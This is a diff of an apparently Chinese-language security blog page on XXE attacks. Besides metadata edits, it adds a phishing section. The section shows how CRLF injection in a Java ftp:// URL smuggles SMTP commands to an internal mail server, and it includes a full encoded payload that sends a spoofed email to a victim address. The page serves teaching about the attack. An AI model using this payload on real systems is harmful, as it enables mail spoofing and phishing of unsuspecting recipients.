@@ -49,9 +49,9 @@
                         xxe
                     </h1>
                     <h2 class="headline">
-                    Jan 24, 2018 00:00
-                    · 2845 words
-                    · 6 minute read
+                    Jan 24, 2019 00:00
+                    · 3156 words
+                    · 7 minute read
                       <span class="tags">
                       
                       
@@ -83,7 +83,6 @@
 <li><a href="#normal-xxe">Normal XXE</a></li>
 <li><a href="#http内网主机探测">http内网主机探测</a></li>
 <li><a href="#http内网主机端口扫描">http内网主机端口扫描</a></li>
-<li><a href="#文件上传">文件上传</a></li>
 <li><a href="#钓鱼">钓鱼</a></li>
 <li><a href="#php-expect-rce">PHP expect RCE</a></li>
 <li><a href="#xxe-dos">xxe dos</a></li>
@@ -390,9 +389,31 @@ continue
 
 <p>利用burp遍历端口</p>
 
-<h3 id="文件上传">文件上传</h3>
-
 <h3 id="钓鱼">钓鱼</h3>
+
+<p>如果内网有一台易受攻击的 SMTP 服务器，我们就能利用 ftp:// 协议结合 CRLF 注入向其发送任意命令，也就是可以指定其发送任意邮件给任意人，这样就伪造了信息源，造成钓鱼（一下实例来自fb 的一篇文章 ）</p>
+
+<p>Java支持在sun.net.ftp.impl.FtpClient中的ftp URI。因此，我们可以指定用户名和密码，例如<a href="ftp://user:password@host:port/test.txt，FTP客户端将在连接中发送相应的USER命令。">ftp://user:password@host:port/test.txt，FTP客户端将在连接中发送相应的USER命令。</a></p>
+
+<p>但是如果我们将%0D%0A (CRLF)添加到URL的user部分的任意位置，我们就可以终止USER命令并向FTP会话中注入一个新的命令，即允许我们向25端口发送任意的SMTP命令：</p>
+
+<p>ex:</p>
+
+<pre><code>ftp://a%0D%0A
+EHLO%20a%0D%0A
+MAIL%20FROM%3A%3Csupport%40VULNERABLESYSTEM.com%3E%0D%0A
+RCPT%20TO%3A%3Cvictim%40gmail.com%3E%0D%0A
+DATA%0D%0A
+From%3A%20support%40VULNERABLESYSTEM.com%0A
+To%3A%20victim%40gmail.com%0A
+Subject%3A%20test%0A
+%0A
+test!%0A
+%0D%0A
+.%0D%0A
+QUIT%0D%0A
+:a@VULNERABLESYSTEM.com:25
+</code></pre>
 
 <h3 id="php-expect-rce">PHP expect RCE</h3>
 
